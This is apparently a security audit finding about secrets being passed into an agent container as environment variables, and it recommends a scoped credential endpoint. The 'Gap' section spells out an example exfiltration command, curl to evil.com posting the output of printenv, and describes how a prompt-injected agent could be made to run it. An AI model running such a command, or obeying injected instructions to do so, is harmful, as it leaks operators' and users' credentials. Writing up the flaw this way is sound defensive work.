<h3 style="font-family:'Fraunces',serif;font-size:22px;font-weight:600;color:var(--hd);letter-spacing:-.01em;margin:0 0 18px;">Credentials injected into containers as env vars — readable by any process via printenv or shell history</h3>
<div class="box box-rd"><div class="box-lbl">The Gap</div>
<p style="white-space:pre-wrap;">Secrets (including the internal token and provider keys) are passed to the container through the `env:` object on `exec()`. Every process inside the container inherits these environment variables, so any agent-run command — or any user-authored skill script — can dump them with `printenv`, read `/proc/self/environ`, or find them in shell history. A single prompt-injected `curl evil.com -d "$(printenv)"` exfiltrates the entire credential set.</p></div>
<div class="box box-gr"><div class="box-lbl">Required Fix</div>
<p style="white-space:pre-wrap;">Never pass secrets as container env vars. Use a scoped credential-retrieval endpoint:
```typescript
// Container fetches a short-lived, request-scoped token from an internal endpoint
// instead of receiving raw keys:
//   GET http://credentials.internal/get?provider=stripe&amp;runId=...
// returns a signed token valid for seconds, scoped to this run and provider.
const token = await fetch(`http://credentials.internal/get?provider=${p}&amp;runId=${runId}`,
  { headers: { "x-run-attestation": runAttestation } }).then(r =&gt; r.text());
```
If env injection is unavoidable, mount secrets as a read-only tmpfs file with restrictive permissions and clear them after the command, and disable shell history in the container.</p></div>
</div>
